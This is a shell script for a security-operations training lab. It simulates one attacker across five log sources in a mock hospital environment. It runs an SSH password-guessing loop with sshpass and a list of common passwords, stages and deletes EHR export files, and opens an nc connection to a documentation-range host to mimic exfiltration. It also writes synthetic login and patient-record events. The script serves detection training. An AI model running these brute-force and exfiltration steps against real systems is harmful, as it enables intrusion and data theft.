#!/bin/sh
# SM1-SCN-01: one attacker, five sources. Linux steps are REAL (live agent); Windows events are imported samples;
# Keycloak / EHR events use the capstone log format. All patient IDs synthetic; 203.0.113.0/24 is a documentation range.
set -e
HERE=$(cd "$(dirname "$0")" && pwd)
LOGS="$HOME/soc1-lab/soc1/logs"
echo "[1] Linux: SSH password guessing against tjones on hrmc-linux-srv01"
for p in winter spring summer autumn Password1 Welcome1 Hospital1 Qwerty123; do
  docker exec hrmc-jumpbox sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 tjones@hrmc-linux-srv01 true 2>/dev/null || true
  sleep 1
done
echo "[1b] Linux: successful login with the guessed password"
docker exec hrmc-jumpbox sshpass -p 'Lab-Only-Pass-1!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null tjones@hrmc-linux-srv01 'id' || true
echo "[2] Linux: files staged in the EHR export share (file integrity monitoring)"
docker exec hrmc-linux-srv01 sh -c 'cat /srv/ehr_exports/*.csv > /srv/ehr_exports/staged_all_exports.csv; chmod 644 /srv/ehr_exports/staged_all_exports.csv; sleep 2; rm -f /srv/ehr_exports/export_1.csv'
echo "[3] Linux: outbound TCP attempt to 203.0.113.77:443 (held open 70 s so the 30 s network check sees it)"
docker exec -d hrmc-linux-srv01 sh -c 'timeout 70 nc -w 70 203.0.113.77 443 </dev/null'
sleep 35
echo "[4] Windows: RDP guessing, logon from outside, mass EHR export reads, rclone upload"
python3 "$HERE/windows_events.py" scenario
echo "[5] Keycloak + EHR: the same billing user opens patient records"
python3 - <<PY
import json, time, datetime as dt
now = lambda: dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")
L = "$LOGS"
with open(f"{L}/keycloak_login.json", "a") as f:
    f.write(json.dumps({"src": "keycloak_login", "event_time": now(), "type": "LOGIN", "username": "test.billing1",
                        "client": "ehr-simulator", "ip": "203.0.113.77", "auth_method": "openid-connect", "scenario": "SM1-SCN-01"}) + "\n")
time.sleep(2)
with open(f"{L}/ehr_access.json", "a") as f:
    for i in range(6):
        f.write(json.dumps({"src": "ehr_access", "event_time": now(), "username": "test.billing1", "role": "billing",
                            "patient_id": f"SYN-PT-3050{i}", "action": "view_chart", "workstation": "HRMC-WS-PFS-02",
                            "scenario": "SM1-SCN-01"}) + "\n"); f.flush(); time.sleep(2)
print("keycloak + ehr events written")
PY
echo "SM1-SCN-01 complete"
